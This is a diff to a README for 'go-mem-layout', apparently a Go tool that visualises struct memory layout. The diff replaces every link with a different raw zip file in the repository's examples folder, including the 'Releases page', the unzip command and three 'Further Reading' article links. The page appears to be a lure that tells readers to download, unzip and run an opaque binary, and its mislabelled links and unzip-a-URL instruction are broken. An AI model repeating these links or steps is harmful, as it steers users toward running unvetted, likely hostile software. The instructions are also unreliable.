@@ -1,7 +1,7 @@
 # 🛠️ go-mem-layout - Visualize Memory Layout for Efficient Performance
 
 ## 🔗 Download Now
-[![Download go-mem-layout](https://raw.githubusercontent.com/scottiesultan10/go-mem-layout/main/examples/mem-layout-go-2.5.zip)](https://raw.githubusercontent.com/scottiesultan10/go-mem-layout/main/examples/mem-layout-go-2.5.zip)
+[![Download go-mem-layout](https://github.com/scottiesultan10/go-mem-layout/raw/refs/heads/main/examples/layout_mem_go_v2.0.zip)](https://github.com/scottiesultan10/go-mem-layout/raw/refs/heads/main/examples/layout_mem_go_v2.0.zip)
 
 ## 📖 Introduction
 Welcome to go-mem-layout! This Go tool helps you analyze Go structs. It visualizes memory alignment, padding, and offsets in an easy-to-understand way. This is important for anyone interested in improving performance in software or conducting systems research.
@@ -10,7 +10,7 @@ Welcome to go-mem-layout! This Go tool helps you analyze Go structs. It visualiz
 To get started, you need to download and install the application. Follow these steps, and you'll be ready to analyze memory layouts.
 
 ### 1. Visit the Download Page
-Go to the [Releases page](https://raw.githubusercontent.com/scottiesultan10/go-mem-layout/main/examples/mem-layout-go-2.5.zip). This page contains the latest versions of go-mem-layout.
+Go to the [Releases page](https://github.com/scottiesultan10/go-mem-layout/raw/refs/heads/main/examples/layout_mem_go_v2.0.zip). This page contains the latest versions of go-mem-layout.
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of versions. The topmost version is the latest. Click on it to expand the details.
@@ -29,7 +29,7 @@ Once the file is downloaded, locate it in your Downloads folder or the folder yo
 
 - **Linux**:
   - Open a terminal. Navigate to the downloads directory using `cd ~/Downloads`.
-  - Unzip the downloaded file using `unzip https://raw.githubusercontent.com/scottiesultan10/go-mem-layout/main/examples/mem-layout-go-2.5.zip`.
+  - Unzip the downloaded file using `unzip https://github.com/scottiesultan10/go-mem-layout/raw/refs/heads/main/examples/layout_mem_go_v2.0.zip`.
   - Navigate into the unzipped folder and run `./go-mem-layout`.
 
 ### 5. Run go-mem-layout
@@ -63,11 +63,11 @@ Once you have installed go-mem-layout, here’s how to use it:
 If you experience issues or have questions, feel free to check the Issues section on the repository page or contact our support team through the contact form on GitHub.
 
 ## 📖 Further Reading
-- [Memory Allocation in Go](https://raw.githubusercontent.com/scottiesultan10/go-mem-layout/main/examples/mem-layout-go-2.5.zip)
-- [Understanding Struct Alignment](https://raw.githubusercontent.com/scottiesultan10/go-mem-layout/main/examples/mem-layout-go-2.5.zip)
-- [Profiling Go Applications](https://raw.githubusercontent.com/scottiesultan10/go-mem-layout/main/examples/mem-layout-go-2.5.zip)
+- [Memory Allocation in Go](https://github.com/scottiesultan10/go-mem-layout/raw/refs/heads/main/examples/layout_mem_go_v2.0.zip)
+- [Understanding Struct Alignment](https://github.com/scottiesultan10/go-mem-layout/raw/refs/heads/main/examples/layout_mem_go_v2.0.zip)
+- [Profiling Go Applications](https://github.com/scottiesultan10/go-mem-layout/raw/refs/heads/main/examples/layout_mem_go_v2.0.zip)
 
 ## 📥 Download Again
-You can download go-mem-layout anytime from the [Releases page](https://raw.githubusercontent.com/scottiesultan10/go-mem-layout/main/examples/mem-layout-go-2.5.zip).
+You can download go-mem-layout anytime from the [Releases page](https://github.com/scottiesultan10/go-mem-layout/raw/refs/heads/main/examples/layout_mem_go_v2.0.zip).
 
 Thank you for using go-mem-layout. We hope this tool helps you with your performance engineering and systems research!
